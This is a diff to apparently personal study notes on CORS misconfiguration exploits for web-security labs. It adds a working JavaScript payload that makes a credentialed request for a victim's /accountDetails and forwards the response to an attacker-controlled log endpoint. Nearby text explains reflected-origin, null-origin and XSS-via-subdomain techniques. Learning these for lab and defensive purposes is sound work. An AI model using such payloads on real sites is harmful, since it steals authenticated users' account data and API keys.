@@ -91,7 +91,30 @@ Some payloads work, some don't:
 </html>
 ```
 
-Host them in the exploit server, observe it works yourself and deliver it to the victim. View the access log afterwards.
+```html
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = "https://0ae3008d041a3bd88339b55f00550027.web-security-academy.net"
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE){
+                    fetch("/log?key=" + xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + "/accountDetails", true);
+            xhr.withCredentials = true;
+            xhr.send(null)
+        </script>
+    </body>
+</html>
+```
+
+Host them in the exploit server, observe it works yourself and deliver it to the victim. View the access log afterwards:
+
+![[CORS Admin.png]]
 # Server-Generated ACAO Header
 
 Some apps provide access to other domains and allow access from any other domains. One way is via reading the Origin header from requests and including a response header stating the requesting origin is allowed. For example:
@@ -162,6 +185,8 @@ The app may allow the "null" Origin to submit a cross-origin request and view th
 Origin: null
 ```
 
+![[ACAO.png]]
+
 This is possible because the app is returning the following headers in a response, which contains sensitive information about the logged in user:
 
 ```html
@@ -228,7 +253,7 @@ The HTML encoding section is as follows:
 ```
 
 Attempt to view the exploit yourself and check it works. Deliver to the victim and then view the access log to confirm you receive their account page.
-# Exploiting CSS via CORS
+# Exploiting XSS via CORS
 
 If a site trusts an origin that is XSS vulnerable, an attacker can exploit it to inject JavaScript that uses CORS to extract sensitive information from the site that trusts it. For example:
 
@@ -279,11 +304,17 @@ Access-Control-Allow-Origin: subdomain.vulnerable-app.com
 ```
 # Exploiting TLS CORS Vulnerability
 
-In an example, an API key may appear in the account page via an AJAX request to `/accountDetails` with the response containing the ACAC header. Try adding the Origin header with a subdomain value. 
+In an example, an API key may appear in the account page via an AJAX request to `/accountDetails` with the response containing the ACAC header. Try adding the Origin header with a subdomain value:
 
-If origin is reflected in ACAO header, it confirms CORS allows access from subdomains via both HTTPS and HTTP (if subdomain is HTTP). Look for any other functionality on the site like a stock checker or for anything that may be using HTTP and vulnerable to XSS such as a productID parameter.
+![[Subdomain.png]]
 
-If the subdomain contains an XSS vulnerability, you can inject a script that will submit a request to the main application and send the response to the attacker’s server. This will work since the subdomain is allowed to view the authenticated responses from the main application.
+If origin is reflected in ACAO header, it confirms CORS allows access from subdomains via both HTTPS and HTTP (if subdomain is HTTP). Look for any other functionality on the site like a stock checker or for anything that may be using HTTP and vulnerable to XSS such as a productID parameter:
+
+![[Stock Subdomain.png]]
+
+If the subdomain contains an XSS vulnerability, you can inject a script that will submit a request to the main application and send the response to the attacker’s server. This will work since the subdomain is allowed to view the authenticated responses from the main application:
+
+![[XSS Stock.png]]
 
 When the XSS script executes, the Origin header's value will be **subdomain.vulnerable-app.com** (reason why is because the XSS script is essentially a part of the application now). This allows the response to contain the authenticated data. The attacker now needs to trick the victim user into visiting their website, while they are authenticated to the vulnerable application.
 
@@ -291,6 +322,8 @@ When the XSS script executes, the Origin header's value will be **subdomain.vul
 >Make sure to set the file extension to .html or no extension also work in Exploit Server labs.
 
 Make sure to encode the angle brackets \<> in the payload within the document.location to prevent breaking the payload. This payload is the exact same as the Basic Origin Reflection, except the payload is injected in the XSS vulnerable parameter of the Subdomain.
+
+![[Final Payload.png]]
 
 ```html
 <html>
